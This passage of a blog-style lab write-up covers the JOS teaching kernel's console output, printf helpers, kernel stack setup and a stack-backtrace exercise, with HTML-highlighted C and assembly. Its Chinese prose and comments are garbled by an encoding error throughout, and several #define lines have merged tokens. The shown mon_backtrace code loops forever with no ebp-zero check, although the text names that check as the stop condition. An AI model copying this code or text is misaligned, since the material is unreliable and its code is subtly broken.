class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// What is the purpose of this?</span><br>    <span class="hljs-keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;   <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦åˆ°è¾¾å±å¹•ç¼“å†²åŒºçš„æœ«å°¾</span><br>        <span class="hljs-type">int</span> i;       <br><br>        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));                 <span class="hljs-comment">//å±å¹•å†…å®¹ä¸Šæ»šä¸€è¡Œ</span><br>        <span class="hljs-keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>            crt_buf[i] = <span class="hljs-number">0x0700</span> | <span class="hljs-string">&#x27; &#x27;</span>; <span class="hljs-comment">//æ¸…ç©ºæœ€åä¸€è¡Œçš„å†…å®¹ï¼Œè®¾ç½®ä¸ºç©ºæ ¼</span><br>        crt_pos -= CRT_COLS;         <span class="hljs-comment">//å°†å…‰æ ‡ç§»åŠ¨åˆ°æ–°ä¸€è¡Œçš„å¼€å¤´</span><br>    &#125;<br><br>    <span class="hljs-comment">/* move that little blinky thing */</span><br>    outb(addr_6845, <span class="hljs-number">14</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos &gt;&gt; <span class="hljs-number">8</span>);<br>    outb(addr_6845, <span class="hljs-number">15</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>\lib\printfmt.cï¼š</strong></p><p>è¿™ä¸ªæ–‡ä»¶å¼€å¤´æœ‰ä¸€æ®µæ³¨é‡Šï¼š</p><p>â€œæ‰“å°å„ç§æ ·å¼çš„å­—ç¬¦ä¸²çš„å­ç¨‹åºï¼Œç»å¸¸è¢«printfï¼Œsprintfï¼Œfprintfå‡½æ•°æ‰€è°ƒç”¨ï¼Œè¿™äº›ä»£ç æ˜¯åŒæ—¶è¢«å†…æ ¸å’Œç”¨æˆ·ç¨‹åºæ‰€ä½¿ç”¨çš„ã€‚â€æ‰€ä»¥ï¼Œè¿™é‡Œè¿™ä¸ªæ–‡ä»¶ä¸­å®šä¹‰çš„å­ç¨‹åºæ˜¯æˆ‘ä»¬èƒ½åœ¨ç¼–ç¨‹æ—¶ç›´æ¥åˆ©ç”¨printfå‡½æ•°å‘å±å¹•è¾“å‡ºä¿¡æ¯çš„å…³é”®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">getuint</span><span class="hljs-params">(va_list *ap, <span class="hljs-type">int</span> lflag)</span><span class="hljs-comment">//ï¼Ÿlflag</span><br>&#123;<br>        <span class="hljs-keyword">if</span> (lflag &gt;= <span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lflag)<br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>);<br>        <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>);<br>  <span class="hljs-comment">//èƒ½å¤Ÿå¤„ç†å¯å˜ä¸ªæ•°è¾“å…¥å‚æ•°çš„åŠŸèƒ½å°±æ˜¯æœ‰va_list, va_arg(), va_start(), va_end()æ¥å®ç°çš„</span><br>&#125;<span class="hljs-comment">//å‡½æ•°æ ¹æ®lflagå‚æ•°çš„å€¼ï¼Œå†³å®šè·å–çš„æ•°çš„å¤§å°ã€‚</span><br><br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>       num = getuint(&amp;ap, lflag);<br>       base = <span class="hljs-number">16</span>;<br>number:<br>       printnum(putch, putdat, num, base, width, padc);<br>       <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231210134724371.png" alt="image-20231210134724371"></p><p>å…¶ä¸­å®šä¹‰äº†ä¸€ä¸ªwhileå¾ªç¯ï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li>é¦–å…ˆä¸€ä¸ªä¸€ä¸ªçš„è¾“å‡ºæ ¼å¼å­—ç¬¦ä¸²fmtä¸­æ‰€æœ‰â€™%â€™ä¹‹å‰çš„å­—ç¬¦ï¼Œå› ä¸ºå®ƒä»¬å°±æ˜¯è¦ç›´æ¥è¾“å‡ºçš„ï¼Œæ¯”å¦‚â€This is %d testâ€ä¸­çš„â€This is â€œã€‚å½“ç„¶å¦‚æœåœ¨æŠŠè¿™äº›å­—ç¬¦ä¸€ä¸ªä¸ªè¾“å‡ºä¸­é‡åˆ°ç»“æŸç¬¦â€™\0â€™ï¼Œåˆ™ç»“æŸè¾“å‡ºã€‚</li><li>å‰©ä½™çš„ä»£ç éƒ½æ˜¯åœ¨å¤„ç†â€™%â€™ç¬¦å·åé¢çš„æ ¼å¼åŒ–è¾“å‡ºï¼Œæ¯”å¦‚æ˜¯%dï¼Œåˆ™æŒ‰ç…§åè¿›åˆ¶è¾“å‡ºå¯¹åº”å‚æ•°ã€‚</li></ul><p>è¡¥å……8è¿›åˆ¶æ ¼å¼ä»£ç åªéœ€è¦ä»¿ç…§å…¶è¾“å‡º10è¿›åˆ¶çš„æˆ–è€…16è¿›åˆ¶çš„æ ¼å¼å°±è¡Œ</p><p><strong>\kern\printf.c</strong></p><p>è¿™ä¸ªæ–‡ä»¶ä¸­å®šä¹‰çš„å°±æ˜¯åœ¨ç¼–ç¨‹ä¸­ä¼šç”¨åˆ°çš„æœ€é¡¶å±‚çš„ä¸€äº›æ ¼å¼åŒ–è¾“å‡ºå­ç¨‹åºï¼Œæ¯”å¦‚printfï¼Œsprintfç­‰ç­‰ã€‚</p><p>è¿™é‡Œæ¯”è¾ƒé‡è¦çš„å°±æ˜¯æˆ‘ä»¬ä¸Šè¾¹ç”¨åˆ°äº†çš„putch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">putch</span><span class="hljs-params">(<span class="hljs-type">int</span> ch, <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br>    cputchar(ch);<br>    *cnt++;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿™ä¸ªå­ç¨‹åºå®ç°çš„å°±æ˜¯æŠŠå­—ç¬¦è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œcntåˆ™æ˜¯è®¡æ•°å™¨ï¼Œè®°å½•çš„å·²ç»è¾“å‡ºçš„å­—ç¬¦ã€‚</p><h4 id="ç»ƒä¹ 9"><a href="#ç»ƒä¹ 9" class="headerlink" title="ç»ƒä¹ 9"></a>ç»ƒä¹ 9</h4><p><strong>åˆ¤æ–­ä¸€ä¸‹æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯ä»å“ªæ¡æŒ‡ä»¤å¼€å§‹åˆå§‹åŒ–å®ƒçš„å †æ ˆç©ºé—´çš„ï¼Œä»¥åŠè¿™ä¸ªå †æ ˆåè½åœ¨å†…å­˜çš„å“ªä¸ªåœ°æ–¹ï¼Ÿå†…æ ¸æ˜¯å¦‚ä½•ç»™å®ƒçš„å †æ ˆä¿ç•™ä¸€å—å†…å­˜ç©ºé—´çš„ï¼Ÿå †æ ˆæŒ‡é’ˆåˆæ˜¯æŒ‡å‘è¿™å—è¢«ä¿ç•™çš„åŒºåŸŸçš„å“ªä¸€ç«¯çš„å‘¢ï¼Ÿ</strong></p><p><strong>ä»é‚£æ¡æŒ‡ä»¤å¼€å§‹çš„ï¼Ÿ</strong></p><p>é¦–å…ˆæ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œboot.Så’Œmain.cæ˜¯PCå¯åŠ¨åé¦–å…ˆè¿è¡Œçš„ä¸¤éƒ¨åˆ†ä»£ç ï¼Œä½†è¿™ä¸¤éƒ¨åˆ†å¹¶ä¸å±äºæ“ä½œç³»ç»Ÿå†…æ ¸ä»£ç ã€‚main.cæœ€åè·³è½¬åˆ°äº†entry.Sï¼Œæ­¤æ—¶æ§åˆ¶æƒè¢«è½¬äº¤ç»™äº†entry.Sã€‚è€Œåœ¨è¿™ä¹‹å‰ï¼Œå¹¶æ²¡æœ‰çœ‹åˆ°ä¸€äº›æœ‰å…³ebpï¼Œespå¯„å­˜å™¨çš„æ“ä½œï¼Œæ‰€ä»¥è¿™ä¼šå„¿å¹¶æ²¡æœ‰åˆå§‹åŒ–å †æ ˆç©ºé—´ã€‚</p><p>entry.Sä¸­ï¼Œæœ‰è¿™æ ·ä¸‰æ¡æŒ‡ä»¤ï¼Œæœ€åä¸€æ¡æŒ‡ä»¤è°ƒç”¨äº†i386_initï¼Œè¿™ä¸ªå­ç¨‹åºä½äºinit.cæ–‡ä»¶ä¹‹ä¸­ã€‚åœ¨è¿™ä¸ªç¨‹åºä¸­å·²ç»å¼€å§‹å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚å¯è§ï¼Œåˆ°i386_initå­ç¨‹åºæ—¶ï¼Œå†…æ ¸çš„å †æ ˆåº”è¯¥å·²ç»è®¾ç½®å¥½äº†ã€‚æ‰€ä»¥å‰è¾¹ä¸¤å¥å°±æ˜¯åˆå§‹åŒ–æ“ä½œã€‚</p><p><img src="/2023/11/29/OSlab1/image-20231210135841791.png" alt="image-20231210135841791"></p><p><strong>åœ¨å†…å­˜çš„ä»€ä¹ˆåœ°æ–¹ï¼Ÿ</strong></p><p>æ—¢ç„¶è¦çœ‹å…·ä½“ä½ç½®ï¼Œåˆ™éœ€è¦è°ƒè¯•ï¼Œè¿›å…¥entry.S</p><p>æ‰€ä»¥é¦–å…ˆåœ¨è¿›å…¥entry.Sçš„ä½ç½®æ‰“æ–­ç‚¹ï¼ˆb *0x7d63ï¼‰</p><p><img src="/2023/11/29/OSlab1/image-20231210141109424.png" alt="image-20231210141109424"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯åœ¨0x0010000cçš„ä½ç½®ï¼Œè¿™æ˜¯å› ä¸ºåœ¨bootmainä¸­ï¼Œå·²ç»æŠŠæ‰€æœ‰çš„å†…æ ¸æ–‡ä»¶åŠ è½½åˆ°0x100000å¤„äº†ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°å†…æ ¸çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨çš„ç‰©ç†åœ°å€å°±æ˜¯0x10000c</p><p>ç»§ç»­è¿è¡Œ</p><p><img src="/2023/11/29/OSlab1/image-20231210141331622.png" alt="image-20231210141331622"></p><p>åœ¨æ‰§è¡Œå®ŒjmpæŒ‡ä»¤åï¼Œåœ°å€å‘ç”Ÿäº†å˜åŒ–ï¼Œå·²ç»è½¬æ¢æˆäº†è™šæ‹Ÿåœ°å€</p><p><img src="/2023/11/29/OSlab1/image-20231210151728706.png" alt="image-20231210151728706"></p><p>å¯ä»¥çœ‹å‡ºåœ¨æ ˆé¡¶åœ¨0xf0117000</p><p>ç„¶ååœ¨kern&#x2F;entry.Sä¸­å®šä¹‰äº†ï¼š</p><p><img src="/2023/11/29/OSlab1/image-20231210152437922.png" alt="image-20231210152437922"></p><p>åœ¨inc&#x2F;memlayout.hä¸­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Kernel stack.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTACKTOPKERNBASE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTKSIZE(8*PGSIZE)   <span class="hljs-comment">// size of a kernel stack</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTKGAP(8*PGSIZE)   <span class="hljs-comment">// size of a kernel stack guard</span></span><br></code></pre></td></tr></table></figure><p>åœ¨inc&#x2F;mmu.hä¸­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGSIZE4096<span class="hljs-comment">// bytes mapped by a page</span></span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ ˆçš„å¤§å°å°±æœ‰32KB</p><p><strong>æŒ‡é’ˆæ˜¯æŒ‡å‘è¿™å—åŒºåŸŸçš„å“ªä¸€ç«¯çš„ï¼Ÿ</strong></p><p>æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼Œæ‰€ä»¥æŒ‡å‘çš„æ˜¯æœ€é«˜å¤„çš„åœ°å€</p><h4 id="ç»ƒä¹ 10"><a href="#ç»ƒä¹ 10" class="headerlink" title="ç»ƒä¹ 10"></a>ç»ƒä¹ 10</h4><p><strong>ä¸ºäº†èƒ½å¤Ÿæ›´å¥½çš„äº†è§£åœ¨x86ä¸Šçš„Cç¨‹åºè°ƒç”¨è¿‡ç¨‹çš„ç»†èŠ‚ï¼Œæˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°åœ¨obj&#x2F;kern&#x2F;kern.asmä¸­test_backtraceå­ç¨‹åºçš„åœ°å€ï¼Œ è®¾ç½®æ–­ç‚¹ï¼Œå¹¶ä¸”æ¢è®¨ä¸€ä¸‹åœ¨å†…æ ¸å¯åŠ¨åï¼Œè¿™ä¸ªç¨‹åºè¢«è°ƒç”¨æ—¶å‘ç”Ÿäº†ä»€ä¹ˆã€‚å¯¹äºè¿™ä¸ªå¾ªç¯åµŒå¥—è°ƒç”¨çš„ç¨‹åºtest_backtraceï¼Œå®ƒä¸€å…±å‹å…¥äº†å¤šå°‘ä¿¡æ¯åˆ°å †æ ˆä¹‹ä¸­ã€‚å¹¶ä¸”å®ƒä»¬éƒ½ä»£è¡¨ä»€ä¹ˆå«ä¹‰ï¼Ÿ</strong></p><p>é¦–å…ˆçœ‹test_backtraceçš„cè¯­è¨€å½¢å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">test_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    cprintf(<span class="hljs-string">&quot;entering test_backtrace %d\n&quot;</span>, x);<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span>)<br>        test_backtrace(x<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">else</span><br>        mon_backtrace(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    cprintf(<span class="hljs-string">&quot;leaving test_backtrace %d\n&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯è§è¿™ä¸ªå­ç¨‹åºæ˜¯ä¸€ä¸ªå¾ªç¯è°ƒç”¨ï¼Œåœ¨æ¯ä¸€å±‚å¾ªç¯ä¸­å…ˆæ‰“å°ä¿¡æ¯ â€œentering test_backtrace xâ€ï¼Œç„¶åå¯¹test_backtraceè¿›è¡Œå¾ªç¯è°ƒç”¨ã€‚å½“è¢«å¾ªç¯è°ƒç”¨å®Œæˆï¼Œå†æ‰“å°ä¿¡æ¯ â€œleaving test_backtrace xâ€ã€‚æ‰€ä»¥æœ€å…ˆè¿›å…¥çš„ç¨‹åºä¼šæœ€åé€€å‡ºã€‚</p><p>æ¯ä¸€æ¬¡è¿›å…¥test_backtraceåï¼Œä»–ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push %ebp<br>mov %esp, %ebp<br>push %ebx<br>sub $0x14, %esp<br></code></pre></td></tr></table></figure><p>è¿™å››ä¸ªæ“ä½œå°†è¢«ç”¨äºå­˜æ”¾è°ƒç”¨è¿™ä¸ªå­ç¨‹åºçš„çˆ¶ç¨‹åºçš„æ ˆå¸§ä¿¡æ¯ï¼Œä»¥åŠä¸ºå½“å‰å­ç¨‹åºåˆ†é…æ–°çš„æ ˆå¸§ã€‚</p><p>å½“è¿è¡Œtest_backtrace(5)ä¹‹å‰ï¼Œespå¯„å­˜å™¨ebpå¯„å­˜å™¨çš„å€¼åˆ†åˆ«ä¸ºå¦‚ä¸‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">esp</span>:<span class="hljs-number">0</span>xf010ffe0<br><span class="hljs-attribute">ebp</span>:<span class="hljs-number">0</span>xf010ffd8<br></code></pre></td></tr></table></figure><p>æ­¤å¤„çš„0xf010ffe0-0xf010fff8å°±æ˜¯è°ƒç”¨test_backtraceçš„ç¨‹åºi386_initçš„æ ˆå¸§</p><p>å½“è°ƒç”¨test_backtrace(5)æ—¶ï¼Œé¦–å…ˆcallæŒ‡ä»¤ä¼šå°†i386_initçš„è¿”å›åœ°å€å‹å…¥æ ˆä¸­ï¼Œæ‰€ä»¥æ­¤æ—¶espå˜æˆäº†0xf010ffdcã€‚</p><p>å­ç¨‹åºä¸­ç¬¬ä¸€å¥push %ebpï¼ŒæŠŠi386_initçš„ebpå¯„å­˜å™¨çš„å€¼å‹å…¥å †æ ˆä¸­ï¼Œå³åœ°å€0xf010ffd8å¤„ï¼Œæ­¤æ—¶espçš„å€¼å˜ä¸º0xf010ffd8ã€‚</p><p>ç„¶å mov %esp, %ebp æŠŠebpçš„å€¼æ›´æ–°ä¸ºespçš„å€¼ï¼Œ0xf010ffd8ã€‚è¿™ä¸ªå°±æ˜¯å½“å‰testå­ç¨‹åºæ ˆå¸§çš„é«˜åœ°å€è¾¹ç•Œã€‚</p><p>ç„¶å push %ebx æŠŠebxå¯„å­˜å™¨çš„å€¼å‹å…¥å †æ ˆï¼Œæ­¤æ—¶espå˜ä¸º0xf010ffd4ã€‚å› ä¸º%ebxå¯„å­˜å™¨å¯èƒ½è¢«è¿™ä¸ªå­ç¨‹åºæ‰€ä½¿ç”¨ï¼Œæ‰€ä»¥å¿…é¡»æŠŠå®ƒä¹‹å‰çš„å€¼ä¿ç•™ã€‚</p><p>ç„¶å sub $0x14, %esp æŠŠespä¸­çš„å€¼å‡å»0x14&#x3D;20ï¼Œespçš„å€¼å˜ä¸º0xf010ffc0ã€‚è¿™å°±æ˜¯ç»™testå­ç¨‹åºåˆ†é…ä¸€ä¸ªå¤§å°ä¸º20ä¸ªå­˜å‚¨å•å…ƒçš„é¢å¤–çš„æ ˆå¸§ç©ºé—´ï¼Œä¾›å®ƒå­˜å‚¨ä¸€äº›ä¸´æ—¶å˜é‡çš„å€¼ã€‚</p><p>æ‰€ä»¥ä¸Šè¿°4æ¡æ±‡ç¼–æŒ‡ä»¤ï¼Œæ‰§è¡Œå®Œæˆåï¼Œespï¼Œebpå¯„å­˜å™¨çš„å€¼å˜åŒ–ä¸º</p><p>ã€€ã€€ã€€ã€€esp : 0xf010ffc0   ebpï¼š0xf010ffd8  </p><p>è¿™å°±æ˜¯test_backtrace(5)å­ç¨‹åºè¿è¡Œæ—¶çš„æ ˆå¸§åœ°å€èŒƒå›´ã€‚è€Œè¾“å…¥å‚æ•°â€™5â€™çš„å€¼å­˜æ”¾åœ¨0xf010ffe0å•å…ƒå¤„ã€‚</p><p>æ€»çš„æ¥è¯´æ¯æ¬¡è°ƒç”¨test_backtraceæ—¶ï¼š</p><ol><li>å°†è¿”å›åœ°å€ï¼ˆcallæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼‰å‹æ ˆ</li><li>å°†ebp, esp, ebxä¸‰ä¸ªå¯„å­˜å™¨çš„å€¼å‹æ ˆï¼Œä»¥ä¾¿é€€å‡ºå‡½æ•°å‰æ¢å¤å®ƒä»¬çš„å€¼</li><li>è°ƒç”¨cprintfå‡½æ•°æ‰“å°â€entering test_backtrace xâ€ï¼Œå…¶ä¸­xä¸ºè¾“å…¥å‚æ•°çš„å€¼</li><li>å°†è¾“å…¥å‚æ•°(x-1)å‹æ ˆ</li><li>è°ƒç”¨test_backtrace(x-1)</li><li>è°ƒç”¨cprintfå‡½æ•°æ‰“å°â€leaving test_backtrace xâ€ï¼Œå…¶ä¸­xä¸ºè¾“å…¥å‚æ•°çš„å€¼</li></ol><p><img src="/2023/11/29/OSlab1/image-20231210170111456.png" alt="image-20231210170111456"></p><h4 id="ç»ƒä¹ 11"><a href="#ç»ƒä¹ 11" class="headerlink" title="ç»ƒä¹ 11"></a>ç»ƒä¹ 11</h4><p>å®ç°mon_backtraceï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½å°±æ˜¯æŠŠå½“å‰æ ˆé‡Œé¢çš„æ‰€æœ‰æ ˆå¸§æŒ‰ç…§è§„å®šçš„æ ¼å¼è¾“å‡ºå‡ºæ¥ï¼š</p><p><img src="/2023/11/29/OSlab1/image-20231210204124667.png" alt="image-20231210204124667"></p><p>å¦‚ä½•å®Œæˆï¼š</p><ul><li>ebpæŒ‡é’ˆæ‰€æŒ‡çš„ä½ç½®å­˜æ”¾çš„æ˜¯çˆ¶å‡½æ•°ä¸­æˆ‘ä»¬ä¿å­˜çš„ebpåœ°å€ï¼Œæ‰€ä»¥çŸ¥é“äº†æ ˆé¡¶çš„ebpçš„å€¼ï¼Œå°±èƒ½çŸ¥é“æ‰€æœ‰çš„ebpçš„å€¼ï¼Œè®²ä¹‰é‡Œæåˆ°å¯ä»¥ä½¿ç”¨icn&#x2F;x86.hä¸­çš„read_ebp()ç›´æ¥è·å–å½“å‰æ ˆé¡¶ebpçš„å€¼</li><li>ebp+4çš„ä½ç½®ï¼Œå­˜æ”¾çš„æ˜¯è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯eipå¯„å­˜å™¨çš„å€¼ã€‚å†å¾€ä¸Šå°±æ˜¯å‡½æ•°è°ƒç”¨æ—¶ä¼ é€’çš„å‚æ•°</li><li>ä»€ä¹ˆæ—¶å€™åœæ­¢ï¼šåœ¨entry.Sä¸­ï¼Œåˆå§‹åŒ–æ ˆå¸§æ—¶ï¼Œå°†ebpåˆå§‹åŒ–æˆäº†0ï¼Œæ‰€ä»¥å½“ebpä¸º0æ—¶å°±å¯ä»¥ç»ˆæ­¢å¾ªç¯</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>        <span class="hljs-comment">// Your code here.</span><br>        <span class="hljs-type">uint32_t</span> ebp = read_ebp(); <span class="hljs-comment">//è·å–å½“å‰ebpå¯„å­˜å™¨ä¸­çš„å€¼ï¼Œæ˜¯ä¸ªåœ°å€</span><br>        <span class="hljs-type">uint32_t</span> * temp = (<span class="hljs-type">uint32_t</span> *)ebp; <span class="hljs-comment">//å®šä¹‰æŒ‡é’ˆå˜é‡ï¼Œç”¨äºå¯»å€æ“ä½œ</span><br>        cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>); <span class="hljs-comment">//æŒ‰ç€æ ¼å¼æ¥</span><br>          <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123; <span class="hljs-comment">//ç»ˆæ­¢æ¡ä»¶</span><br>                cprintf(<span class="hljs-string">&quot;  ebp %08x eip %08x args %08x %08x %08x %08x %08x\n&quot;</span>, temp, *(temp+<span class="hljs-number">1</span>), *(temp+<span class="hljs-number">2</span>), *(temp+<span class="hljs-number">3</span>), *(temp+<span class="hljs-number">4</span>), *(temp+<span class="hljs-number">5</span>), *(temp+<span class="hljs-number">6</span>));<span class="hljs-comment">//%08xè¾“å‡º8ä¸ªå­—èŠ‚çš„16è¿›åˆ¶æ•°ï¼Œå°†tempæ›´æ–°ä¸ºè°ƒç”¨è€…æ ˆå¸§çš„ebp</span><br>                temp = (<span class="hljs-type">uint32_t</span> *)(*temp);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231210210244148.png" alt="image-20231210210244148"></p><p><img src="/2023/11/29/OSlab1/image-20231210210220345.png" alt="image-20231210210220345"></p><h3 id="åæ€ä¸æ”¶è·"><a href="#åæ€ä¸æ”¶è·" class="headerlink" title="åæ€ä¸æ”¶è·"></a>åæ€ä¸æ”¶è·</h3><p>æœ¬æ¬¡å®éªŒä½¿ç”¨çš„æ˜¯BIOS+MBRçš„å¯åŠ¨æ–¹å¼ï¼Œä½†ç°åœ¨å¤šæ•°ä½¿ç”¨UEFI+GPTï¼ˆæˆ–è€…è¯´æ˜¯UEFI+MBRï¼‰</p><ul><li>**BIOS:**æ˜¯ä¸€ç»„å›ºåŒ–åˆ°è®¡ç®—æœºå†…ä¸»æ¿ä¸Šä¸€ä¸ªROMèŠ¯ç‰‡ä¸Šçš„ç¨‹åºï¼Œå®ƒä¿å­˜ç€è®¡ç®—æœºæœ€é‡è¦çš„åŸºæœ¬è¾“å…¥è¾“å‡ºçš„ç¨‹åºã€å¼€æœºåè‡ªæ£€ç¨‹åºå’Œç³»ç»Ÿè‡ªå¯åŠ¨ç¨‹åºï¼Œå®ƒå¯ä»CMOSä¸­è¯»å†™ç³»ç»Ÿè®¾ç½®çš„å…·ä½“ä¿¡æ¯ã€‚</li><li>**UEFI:**å…¨ç§°â€œç»Ÿä¸€çš„å¯æ‰©å±•å›ºä»¶æ¥å£â€(Unified Extensible Firmware Interface)ï¼Œ æ˜¯ä¸€ç§è¯¦ç»†æè¿°ç±»å‹æ¥å£çš„æ ‡å‡†ã€‚è¿™ç§æ¥å£ç”¨äºæ“ä½œç³»ç»Ÿè‡ªåŠ¨ä»é¢„å¯åŠ¨çš„æ“ä½œç¯å¢ƒï¼ŒåŠ è½½åˆ°ä¸€ç§æ“ä½œç³»ç»Ÿä¸Šã€‚</li><li>**MBR:**å³ä¸»å¼•å¯¼è®°å½•ï¼Œæ˜¯å¯¹IBMå…¼å®¹æœºçš„ç¡¬ç›˜æˆ–è€…å¯ç§»åŠ¨ç£ç›˜åˆ†åŒºæ—¶ï¼Œåœ¨é©±åŠ¨å™¨æœ€å‰ç«¯çš„ä¸€æ®µå¼•å¯¼æ‰‡åŒºã€‚MBRæè¿°äº†é€»è¾‘åˆ†åŒºçš„ä¿¡æ¯ï¼ŒåŒ…å«æ–‡ä»¶ç³»ç»Ÿä»¥åŠç»„ç»‡æ–¹å¼ã€‚æ­¤å¤–ï¼ŒMBRè¿˜åŒ…å«è®¡ç®—æœºåœ¨å¯åŠ¨çš„ç¬¬äºŒé˜¶æ®µåŠ è½½æ“ä½œç³»ç»Ÿçš„å¯æ‰§è¡Œä»£ç æˆ–è¿æ¥æ¯ä¸ªåˆ†åŒºçš„å¼•å¯¼è®°å½•ï¼ˆVBRï¼‰ã€‚è¿™ä¸ªMBRä»£ç é€šå¸¸è¢«ç§°ä¸ºå¼•å¯¼ç¨‹åºã€‚</li><li>**GPT:**æ˜¯GUIDç£ç¢Ÿåˆ†å‰²è¡¨ï¼ˆGUIDPartition Tableï¼‰çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªå®ä½“ç¡¬ç›˜çš„åˆ†åŒºè¡¨çš„ç»“æ„å¸ƒå±€çš„æ ‡å‡†ã€‚å®ƒæ˜¯å¯æ‰©å±•å›ºä»¶æ¥å£ï¼ˆEFIï¼‰æ 